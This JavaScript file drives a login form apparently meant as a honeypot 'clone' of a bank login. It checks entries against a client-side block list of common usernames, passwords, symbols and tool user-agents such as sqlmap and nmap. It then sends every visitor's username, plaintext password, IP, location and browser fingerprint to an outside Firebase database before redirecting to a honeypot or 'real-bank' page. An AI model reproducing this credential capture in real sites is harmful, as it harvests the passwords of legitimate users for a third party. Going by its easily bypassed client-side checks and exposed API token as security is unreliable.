document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();
  handleLogin();
});

function isMaliciousInput(value) {
  const symbols = ["<", ">", "&", "|", "=", ";", "'", "\""];
  return symbols.some(sym => value.includes(sym));
}

function isSuspiciousIP(ipData) {
  const hostname = ipData.hostname || "";
  return hostname.includes("datacenter") || hostname.includes("amazonaws") || hostname.includes("digitalocean");
}

function handleLogin() {
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;
  const userAgent = navigator.userAgent.toLowerCase();
  let attempts = JSON.parse(localStorage.getItem("login_attempts") || "0");
  attempts++;
  localStorage.setItem("login_attempts", JSON.stringify(attempts));

  const badUsernames = ["admin", "root", "test"];
  const badPasswords = ["123456", "admin", "password", "root"];
  const badAgents = ["curl", "python", "sqlmap", "nmap", "dirbuster"];

  const localSuspicious =
    badUsernames.includes(username.toLowerCase()) ||
    badPasswords.includes(password.toLowerCase()) ||
    isMaliciousInput(username) ||
    isMaliciousInput(password) ||
    badAgents.some(agent => userAgent.includes(agent)) ||
    attempts > 3;

  fetch("https://ipinfo.io/json?token=27824af3b12c98")
    .then(res => res.json())
    .then(ipData => {
      const isIPMalicious = isSuspiciousIP(ipData);
      const isHacker = localSuspicious || isIPMalicious;

      const payload = {
        ip: ipData.ip,
        city: ipData.city,
        country: ipData.country,
        isp: ipData.org || ipData.hostname || "unknown",
        suspiciousIP: isIPMalicious,
        fingerprint: "pending",
        username,
        password,
        attempts,
        userAgent,
        timestamp: new Date().toISOString(),
        isHacker,
        event: "Login attempt"
      };

      Fingerprint2.get(function (components) {
        const values = Array.isArray(components)
          ? components.map(p => p.value).join()
          : JSON.stringify(components); // fallback
        payload.fingerprint = Fingerprint2.x64hash128(values, 31);

        fetch("https://honeypot-715b9-default-rtdb.firebaseio.com/clone_access.json", {
          method: "POST",
          body: JSON.stringify(payload)
        }).then(() => {
          if (isHacker) {
            window.location.href = "honypot.html";
          } else {
            window.location.href = "real-bank.html";
          }
        });
      });
    });
}
